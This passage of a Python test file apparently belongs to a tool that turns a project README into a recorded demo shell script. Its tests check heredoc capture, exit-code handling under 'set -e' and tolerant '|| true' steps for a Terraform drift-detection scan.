    cmds = [tc.cmd for tc in tape]
    assert "mkdir -p /tmp/tfdrift-demo" in cmds
    # Heredoc IS on camera now — typed line by line via TapeCommand.lines.
    heredoc_tc = next(tc for tc in tape if "\n" in tc.cmd)
    assert heredoc_tc.lines[0].startswith("cat > /tmp/tfdrift-demo/main.tf")
    assert heredoc_tc.lines[-1] == "EOF"
    assert len(heredoc_tc.lines) > 2


def test_assertion_tolerates_nonzero_exit_when_pattern_set(tmp_path):
    """Regression (tfdrift run): drift detectors exit nonzero ON SUCCESS
    (finding drift is the point). With an expected_pattern, the pattern is
    the criterion — the exit code must not abort the script under set -e."""
    plan = make_plan()
    plan.success_criteria.command = "tfdrift scan"
    plan.success_criteria.expected_pattern = "[Dd]rift detected"
    write_artifacts(make_output(["tfdrift --version"]), tmp_path, plan,
                    "https://github.com/x/y")
    text = (tmp_path / "commands.sh").read_text()
    assert "set +e" in text
    assert "r2d_exit=$?" in text
    assert text.index("set +e") < text.index('r2d_output="$(tfdrift scan') < text.index("\nset -e\n")
    # pattern is the gate, not the exit code
    assert "grep" in text.split("\nset -e\n", 1)[1]
    assert '"$r2d_exit" -ne 0' not in text


def test_assertion_requires_exit_zero_without_pattern(tmp_path):
    plan = make_plan()
    plan.success_criteria.expected_pattern = None
    write_artifacts(make_output(["x"]), tmp_path, plan, "https://github.com/x/y")
    text = (tmp_path / "commands.sh").read_text()
    assert '"$r2d_exit" -ne 0' in text
    assert "grep -qE" not in text


def test_findings_step_gets_tolerant_or_true(tmp_path):
    """Regression (tfdrift run): the scan appears as a STEP under set -e and
    exits nonzero (drift found) → aborts before the assertion. Findings-success
    step commands must get `|| true`."""
    from readme2demo.distill import write_commands_sh
    from readme2demo.types import (
        AgentResult, CommandEntry, CommandLog, DistillOutput, Plan,
        SuccessCriteria, TutorialOutline,
    )

    log = CommandLog(
        engine="claude-code",
        entries=[
            CommandEntry(cmd="tfdrift scan --path /tmp/demo", exit_code=1,
                         output="Drift detected", findings_success=True),
        ],
        result=AgentResult(outcome="success"),
    )
    out = DistillOutput(
        commands=["terraform apply -auto-approve", "tfdrift scan --path /tmp/demo"],
        tape=[], outline=TutorialOutline(title="T", intro="I."),
    )
    plan = Plan(quickstart_summary="q", success_criteria=SuccessCriteria(
        command="tfdrift scan --path /tmp/demo", expected_pattern="Drift detected"))
    write_commands_sh(out, tmp_path, plan, "https://github.com/x/y", log)
    text = (tmp_path / "commands.sh").read_text()
    # the findings step is tolerant; the normal step is not
    assert "tfdrift scan --path /tmp/demo || true" in text
    assert "terraform apply -auto-approve || true" not in text
    assert "terraform apply -auto-approve\n" in text
